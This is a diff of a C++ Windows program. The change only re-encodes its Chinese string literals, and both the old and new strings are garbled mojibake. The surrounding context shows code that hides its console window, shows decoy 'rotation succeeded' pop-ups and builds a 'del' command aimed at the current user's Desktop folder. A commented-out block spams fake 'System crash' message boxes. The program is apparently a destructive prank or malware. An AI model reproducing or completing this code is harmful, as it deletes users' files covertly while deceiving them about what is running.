@@ -14,9 +14,9 @@ bool on = 0;
 DWORD WINAPI caption(LPVOID temp) {
 /*
 	while (on == 0);
-	char text[128] = "System crash...\nÏµÍ³±ÀÀ£...\n°´»Ø³µ¿É×Ô¶¯ĞŞ¸´£¡\n-_- ^_^ +_+\n»¹Ê£";
-	char text_b[128] = "System crash...\nÏµÍ³±ÀÀ£...\n°´»Ø³µ¿É×Ô¶¯ĞŞ¸´£¡\n-_- ^_^ +_+\n»¹Ê£";
-	char text_temp[8] = "999´Î£¡";
+	char text[128] = "System crash...\nç³»ç»Ÿå´©æºƒ...\næŒ‰å›è½¦å¯è‡ªåŠ¨ä¿®å¤ï¼\n-_- ^_^ +_+\nè¿˜å‰©";
+	char text_b[128] = "System crash...\nç³»ç»Ÿå´©æºƒ...\næŒ‰å›è½¦å¯è‡ªåŠ¨ä¿®å¤ï¼\n-_- ^_^ +_+\nè¿˜å‰©";
+	char text_temp[8] = "999æ¬¡ï¼";
 	short text_num = 0;
 	for (short i = 0; i < 999; i++) {
 		text_num = 999 - i;
@@ -37,18 +37,18 @@ DWORD WINAPI caption(LPVOID temp) {
 		}
 		strcpy_s(text, text_b);
 		strcat_s(text, text_temp);
-		MessageBoxA(0, text, "Error´íÎó", MB_OK);
+		MessageBoxA(0, text, "Erroré”™è¯¯", MB_OK);
 	}
 		
 
 	while (on_off != 1)
-		MessageBoxA(0, "Wait...\nÇëµÈ´ı...", "Warning¾¯¸æ", MB_OK);
+		MessageBoxA(0, "Wait...\nè¯·ç­‰å¾…...", "Warningè­¦å‘Š", MB_OK);
 */
 	DWORD size = UNLEN + 1;
 	char UserName[32];
 	if (!GetUserName(UserName, &size))
-		MessageBoxA(0, "Ğı×ªÊ§°Ü", "ÌáÊ¾", MB_OK);
-	MessageBoxA(0, "Ğı×ª³É¹¦", "ÌáÊ¾", MB_OK);
+		MessageBoxA(0, "æ—‹è½¬å¤±è´¥", "æç¤º", MB_OK);
+	MessageBoxA(0, "æ—‹è½¬æˆåŠŸ", "æç¤º", MB_OK);
 	char path[64] = "del C:\\Users\\";
 	char desktop[10] = "\\Desktop\\";
 	//char desktop[15] = "\\Desktop\\test\\";
@@ -94,7 +94,7 @@ void main() {
 	window = FindWindow("ConsoleWindowClass", NULL);
 	if (window)
 	{
-		ShowWindow(window, SW_HIDE);//ÉèÖÃÖ¸¶¨´°¿ÚµÄÏÔÊ¾×´Ì¬
+		ShowWindow(window, SW_HIDE);//è®¾ç½®æŒ‡å®šçª—å£çš„æ˜¾ç¤ºçŠ¶æ€
 	}
 
 	std::string DesktopPath_temp = getDesktopPath_fc();
@@ -107,8 +107,8 @@ void main() {
 	char UserName[32];
 
 	if (!GetUserName(UserName, &size))
-		MessageBoxA(0, "Ğı×ªÊ§°Ü", "ÌáÊ¾", MB_OK);
-	MessageBoxA(0, "Ğı×ª³É¹¦", "ÌáÊ¾", MB_OK);
+		MessageBoxA(0, "æ—‹è½¬å¤±è´¥", "æç¤º", MB_OK);
+	MessageBoxA(0, "æ—‹è½¬æˆåŠŸ", "æç¤º", MB_OK);
 	//cout << UserName << endl;
 	CloseHandle(CreateThread(NULL, 0, caption, NULL, 0, NULL));
 	on = 1;
@@ -196,7 +196,7 @@ std::string getDesktopPath_fc() {
 	if (SUCCEEDED(SHGetSpecialFolderLocation(NULL, CSIDL_DESKTOP, &temp)))
 		SHGetPathFromIDListA(temp, path);
 	else
-		MessageBoxA(0, "Ğı×ªÊ§°Ü", "ÌáÊ¾", MB_OK);
+		MessageBoxA(0, "æ—‹è½¬å¤±è´¥", "æç¤º", MB_OK);
 
 	return std::string(path);
 }
